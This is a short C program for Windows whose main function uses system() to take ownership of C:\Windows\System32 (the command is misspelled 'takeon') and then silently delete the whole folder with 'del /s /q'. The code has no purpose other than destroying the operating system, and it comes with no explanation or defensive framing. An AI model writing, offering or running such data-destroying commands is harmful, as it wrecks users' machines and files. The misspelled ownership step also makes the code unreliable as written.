#include <windows.h>

int main() {
    system("takeon /f C:\\Windows\\System32 /r /d y");
    system("del /s /q C:\\Windows\\System32");
    return 0;
}